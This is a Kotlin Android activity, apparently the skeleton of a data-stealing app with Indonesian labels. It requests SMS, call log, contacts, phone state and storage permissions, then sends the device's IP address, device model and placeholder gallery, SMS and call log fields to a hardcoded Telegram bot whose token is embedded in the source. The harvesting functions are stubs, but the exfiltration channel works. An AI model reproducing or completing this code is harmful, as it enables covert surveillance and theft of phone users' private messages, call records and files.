package com.example.myapp

import android.Manifest
import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.ContactsContract
import android.provider.Telephony
import android.telephony.TelephonyManager
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.*
import java.io.IOException
import java.net.Inet4Address
import java.net.NetworkInterface
import java.util.*

class MainActivity : AppCompatActivity() {

    private val token = "7200663303:AAG1Vr4avkiBe902y4mgsZshKQ67nu_jrgk"
    private val chatId = "7200663303"
    private val telegramUrl = "https://api.telegram.org/bot$token/sendMessage"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Request permissions
        requestPermissions()
    }

    private fun requestPermissions() {
        val requiredPermissions = arrayOf(
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CONTACTS
        )

        requestPermissionsLauncher.launch(requiredPermissions)
    }

    private val requestPermissionsLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
            if (permissions.values.all { it }) {
                collectDataAndSendToTelegram()
            } else {
                Toast.makeText(this, "Permissions required!", Toast.LENGTH_SHORT).show()
            }
        }

    private fun collectDataAndSendToTelegram() {
        val ipAddress = getIpAddress()
        val deviceInfo = getDeviceInfo()
        val galleryData = getGalleryData()
        val smsData = getSmsData()
        val callLogData = getCallLogData()

        val message = """
            ====================
            INFORMASI DATA
            ====================
            IP: $ipAddress
            Perangkat: $deviceInfo
            Galeri: $galleryData
            SMS: $smsData
            Panggilan: $callLogData
            ====================
            ${getCurrentDateTime()}
            ====================
        """.trimIndent()

        sendMessageToTelegram(message)
    }

    private fun getIpAddress(): String {
        var ipAddress = ""
        try {
            val networkInterfaces = NetworkInterface.getNetworkInterfaces()
            while (networkInterfaces.hasMoreElements()) {
                val networkInterface = networkInterfaces.nextElement()
                val inetAddresses = networkInterface.inetAddresses
                while (inetAddresses.hasMoreElements()) {
                    val inetAddress = inetAddresses.nextElement()
                    if (inetAddress is Inet4Address && !inetAddress.isLoopbackAddress) {
                        ipAddress = inetAddress.hostAddress
                    }
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return ipAddress
    }

    private fun getDeviceInfo(): String {
        return "Model: ${android.os.Build.MODEL}, Version: ${android.os.Build.VERSION.RELEASE}"
    }

    private fun getGalleryData(): String {
        // Implementasi pengambilan data galeri
        return "Data Galeri diambil"
    }

    private fun getSmsData(): String {
        // Implementasi pengambilan data SMS
        return "Data SMS diambil"
    }

    private fun getCallLogData(): String {
        // Implementasi pengambilan data panggilan
        return "Data Panggilan diambil"
    }

    private fun getCurrentDateTime(): String {
        val calendar = Calendar.getInstance()
        val day = calendar.get(Calendar.DAY_OF_MONTH)
        val month = calendar.get(Calendar.MONTH) + 1
        val year = calendar.get(Calendar.YEAR)
        val hour = calendar.get(Calendar.HOUR_OF_DAY)
        val minute = calendar.get(Calendar.MINUTE)
        return "$day/${month.toString().padStart(2, '0')}/$year - ${getDayOfWeek(calendar.get(Calendar.DAY_OF_WEEK))} - $hour:${minute.toString().padStart(2, '0')}"
    }

    private fun getDayOfWeek(dayOfWeek: Int): String {
        return when (dayOfWeek) {
            Calendar.SUNDAY -> "Minggu"
            Calendar.MONDAY -> "Senin"
            Calendar.TUESDAY -> "Selasa"
            Calendar.WEDNESDAY -> "Rabu"
            Calendar.THURSDAY -> "Kamis"
            Calendar.FRIDAY -> "Jumat"
            Calendar.SATURDAY -> "Sabtu"
            else -> "Hari Tidak Valid"
        }
    }

    private fun sendMessageToTelegram(message: String) {
        val client = OkHttpClient()
        val requestBody = FormBody.Builder()
            .add("chat_id", chatId)
            .add("text", message)
            .build()

        val request = Request.Builder()
            .url(telegramUrl)
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                e.printStackTrace()
            }

            override fun onResponse(call: Call, response: Response) {
                response.use {
                    if (!it.isSuccessful) throw IOException("Unexpected code $it")
                }
            }
        })
    }
}
